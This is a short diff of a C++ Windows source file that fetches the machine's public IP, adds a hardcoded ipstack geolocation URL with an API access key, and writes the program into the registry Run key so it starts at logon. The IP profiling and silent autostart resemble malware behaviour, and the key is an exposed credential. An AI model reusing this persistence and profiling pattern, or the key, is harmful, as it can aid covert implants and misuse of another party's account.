@@ -1,4 +1,3 @@
-#include "pch.h"
 #include "Scripts_all.h"
 #include <Windows.h>
 #include <iostream>
@@ -6,6 +5,7 @@
 
  std::string Auto::get_ip()
  {
+	 std::string site = "http://api.ipstack.com/91.167.128.194?access_key=0698c1f50b4f0f15ac97a93109070faf";
 	 const std::string url = "api.ipify.org";
 	
 	 std::string website_HTML;
@@ -55,10 +55,9 @@
 			 i += 1;
 		 }
 	 }
-
+	 std::cout << website_HTML << std::endl;
 	 closesocket(Socket);
 
-	 std::cout << "\n\n\n";
 	 for (size_t i = 0; i < website_HTML.length(); ++i) website_HTML[i] = tolower(website_HTML[i], local);
 
 	 std::istringstream ss(website_HTML);
@@ -90,7 +89,7 @@
 	 HKEY newValue;
 	 LONG lResult = RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
 	 BOOL fsuccess = (lResult == 0);
-	 if (fsuccess)
+	 if (fsuccess)	
 	 {
 		 RegSetValueEx(newValue, (LPCWSTR)keyname, 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
 		 RegCloseKey(newValue);
